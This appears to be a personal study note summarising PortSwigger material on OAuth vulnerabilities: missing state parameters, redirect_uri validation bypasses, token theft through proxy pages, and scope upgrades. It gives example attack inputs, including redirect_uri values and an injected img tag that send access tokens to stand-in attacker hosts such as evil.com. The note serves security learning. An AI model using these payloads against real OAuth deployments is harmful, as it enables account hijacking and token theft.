https://portswigger.net/research/hidden-oauth-attack-vectors

## Flawed [[CSRF]] protection
`state` parameter should ideally contain an unguessable value, such as the of something tied to user's session when it first initiatees the OAuth flow. The value is then passed back and forth between the client and OAuth server as form of CSRF token. If `state` is omitted, it's possible to hijack a victim's account by binding it to the attacker social media.
lab is broken:  https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking
#to-be-continued 

# Leaking authorization codes and access **tokens**
Send `/callback` URL with  tampered `redirect_uri=attacker-server.evil/` to hijack access token.
# Flawed redirect_uri validation
Ways to bypass `redirect_uri` validation:
1. Try removing aor adding arbitrary path, query params, and fragments
2. If you can append extra values to the default `redirect_uri`, you might be able to exploit [[URL discrepancies]] between the parsing of the URI by the different components of the OAut service. E.g.
```
https://default-host.com &@foo.evil-user.net#@bar.evil-user.net
```
3. Server-side parameter pollution, .e.g
```
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
```
4. URL starting with `localhost` might be available since it's used for development, e.g. `http://localhost.evil.com`
5. Experiment with `response_mode` setting from `query`  to `fragment` can alter the parsing. If `web_message` response mode is supported, this can enlarge list of allowed domains.

# Stealing codes and access tokens via a proxy page
Look for vulnerabilities that allow you to extract the code or token and send it to external domain.
1. Path traversal e.g. `https://client-app.com/oauth/callback/../../example/path`
2. Open redirects
3. Dangerous JS that handles query params and URL fragments
4. XSS vulnerabilities
5. HTML injection vulnerabilities. Example: inject `<img src="evil.com" />` into a page you can specify within `redirect_uri` and receive access token via `Referer` and receive access token via `Referer`.
#to-be-continued https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page

# Flawed scope validation
#### Scope upgrade: authorization code flow
```http
POST /token
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20 email%20profile
```
If the server does not validate this against the scope from the initial authorization request, it will sometimes generate an access token using the new scope and send this to the attacker's client application:
```json
{
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid email profile",
    …
}
```
#### Scope upgrade: implicit flow
Once they have stolen an access token, they can send a normal browser-based request to the OAuth service's `/userinfo` endpoint, manually adding a new `scope` parameter in the process. In case of the server doesn't validate `scope` against the that was used when genrating the token.

### Unverified user registration
Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address in some cases.

